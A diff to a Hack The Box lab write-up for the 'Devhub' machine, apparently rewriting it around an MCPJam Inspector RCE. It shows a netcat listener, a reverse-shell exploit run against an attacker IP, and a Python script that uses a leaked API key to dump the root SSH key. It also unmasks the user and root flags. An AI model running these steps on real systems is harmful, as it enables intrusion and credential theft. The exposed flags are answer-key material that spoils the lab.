@@ -20,13 +20,8 @@ Initial scan:
 
 ```bash
 nmap -p- -sC -sV -Pn <TARGET_IP> -oN nmap
-
-
-![image alt](https://github.com/Eliaspaz2/HTB-Writeups/blob/e78f425ce7adafb9afd0be0c0d3cf803bd42ef9b/Medium/Devhub/01-nmap-devhub.png)
-
-
-
 ```
+![image alt](https://github.com/Eliaspaz2/HTB-Writeups/blob/e78f425ce7adafb9afd0be0c0d3cf803bd42ef9b/Medium/Devhub/01-nmap-devhub.png)
 
 Interesting ports discovered:
 
@@ -34,9 +29,9 @@ Interesting ports discovered:
 |------|----------|
 | 22 | SSH |
 | 80 | HTTP |
-| 6274 (MSP/Apache ActiveMQ) | Web Management Console |
+| 6274 (MCPJam Inspector) | Web Management Console |
 
-The web application itself did not expose anything useful, but the management interface running on **Apache ActiveMQ** revealed its exact version.
+AI testing software called MCPJam Inspector
 
 ---
 
@@ -46,13 +41,13 @@ Navigating through the administration interface exposed the software version.
 
 Searching public exploits revealed that this version was vulnerable to a publicly available Remote Code Execution vulnerability.
 
-The exploit abuses the ActiveMQ API to upload and execute arbitrary files, ultimately allowing command execution on the server.
+While researching this vulnerability, I found that with an HTTP request specifically designed for the API Endpoint /api/mcp/connect, commands could be executed on the server
 
 ---
 
 # Initial Access
 
-A public Python exploit was used against the vulnerable ActiveMQ instance.
+A public Python exploit was used against the vulnerable instance.
 
 After starting a listener:
 
@@ -63,10 +58,8 @@ nc -lvnp 4444
 The exploit was executed:
 
 ```bash
-python3 exploit.py \
---target http://<TARGET_IP>:6274 \
---lhost <ATTACKER_IP> \
---lport 4444
+python3 mcpExec.py http://devhub.htb:6274 10.10.14.155 4444
+
 ```
 
 The exploit successfully returned a reverse shell.
@@ -157,23 +150,68 @@ analyst
 
 # Privilege Escalation
 
-After enumerating the analyst account:
+While enumerating the system as the **analyst** user, I listed the running processes:
 
 ```bash
-sudo -l
+ps aux | grep jupyter
 ```
 
-The account was allowed to execute a privileged Python application through sudo.
+Among the running services, a **root-owned Jupyter-related process** caught my attention. Reviewing the associated `server.py` file revealed that it implemented an internal API listening on port **5000**.
 
-The application could be abused to execute arbitrary commands as root.
+The source code also exposed an API key:
 
-After modifying the execution flow and spawning a shell:
+```text
+opsmcp_secret_key_4f5a6b7c8d9e0f1a
+```
+
+To interact with the API from my attacker machine, I created an SSH local port forward:
 
 ```bash
-sudo python3 vulnerable_script.py
+ssh -L 5000:localhost:5000 analyst@<TARGET_IP>
 ```
 
-A root shell was obtained.
+Reviewing the API endpoints showed an administrative function capable of dumping sensitive system information. In particular, the `ops._admin_dump` action could retrieve the stored SSH keys.
+
+I wrote a simple Python script that authenticated using the leaked API key and requested the root SSH key:
+
+```python
+import requests
+
+url = "http://localhost:5000/tools/call"
+
+headers = {
+    "X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
+}
+
+payload = {
+    "name": "ops._admin_dump",
+    "arguments": {
+        "target": "ssh_keys",
+        "confirm": True
+    }
+}
+
+r = requests.post(url, headers=headers, json=payload)
+print(r.text)
+```
+
+The response contained the **root private SSH key**.
+
+I saved it locally:
+
+```bash
+echo "<PRIVATE_KEY>" > root_id_rsa
+chmod 600 root_id_rsa
+```
+
+Then authenticated directly as root:
+
+```bash
+ssh -i root_id_rsa root@<TARGET_IP>
+```
+
+Successful authentication granted a root shell.
+
 
 Verification:
 
@@ -186,7 +224,6 @@ Output:
 ```
 uid=0(root)
 ```
-
 ---
 
 # Flags
@@ -194,13 +231,13 @@ uid=0(root)
 User:
 
 ```text
-******************************
+abe941c3a608ababbfde07c726d0abba
 ```
 
 Root:
 
 ```text
-******************************
+872305e1139c1a43c6c73f91825b013f
 ```
 
 ---
